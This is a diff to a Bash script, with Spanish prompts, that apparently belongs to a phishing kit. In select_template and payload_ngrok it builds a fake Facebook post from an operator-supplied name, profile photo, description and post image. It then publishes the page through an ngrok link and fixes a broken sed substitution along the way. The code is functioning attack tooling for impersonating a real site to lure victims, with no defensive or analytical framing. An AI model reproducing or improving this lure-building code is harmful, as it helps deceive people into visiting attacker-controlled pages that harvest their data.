@@ -125,8 +125,14 @@ select_template() {
             
             read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ingresa el nombre de la persona que publicó: \e[0m' nombre_usuario_facebook
             read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ingresa la ruta de la foto de perfil: \e[0m' foto_perfil_facebook
+            mv "$foto_perfil_facebook" "${foto_perfil_facebook// /-}" -n
+            cp $foto_perfil_facebook templates/facebook/foto_perfil.jpeg
+            foto_perfil_facebook='templates/facebook/foto_perfil.jpeg'
             read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ingresa la descripción de la publicación: \e[0m' descripcion_facebook
             read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ingresa la foto de la publicación: \e[0m' foto_publicacion_facebook
+            mv "$foto_publicacion_facebook" "${foto_publicacion_facebook// /-}" -n
+            cp $foto_publicacion_facebook templates/facebook/foto_publicacion.jpeg
+            foto_publicacion_facebook='templates/facebook/foto_publicacion.jpeg'
             ruta_template="facebook/facebook.html"
 
 
@@ -224,9 +230,11 @@ payload_ngrok() {
     sed -i 's+ruta_template+'$ruta_template'+g' index.php
     
     if [[ $option_tem -eq 1 ]]; then
+        foto_perfil_facebook=$link'/'$foto_perfil_facebook
+        foto_publicacion_facebook=$link'/'$foto_publicacion_facebook
         sed 's+foto_perfil_facebook+'$foto_perfil_facebook'+g' templates/facebook/facebook_t.html > templates/facebook/facebook.html
         sed -i 's+nombre_usuario_facebook+'$nombre_usuario_facebook'+g' templates/facebook/facebook.html
-        sed -i '.*+descripcion_facebook+'$descripcion_facebook'+g' templates/facebook/facebook.html
+        sed -i 's+descripcion_facebook+'"$descripcion_facebook"'+g' templates/facebook/facebook.html
         sed -i 's+foto_publicacion_facebook+'$foto_publicacion_facebook'+g' templates/facebook/facebook.html
 
     elif [[ $option_tem -eq 4 ]]; then
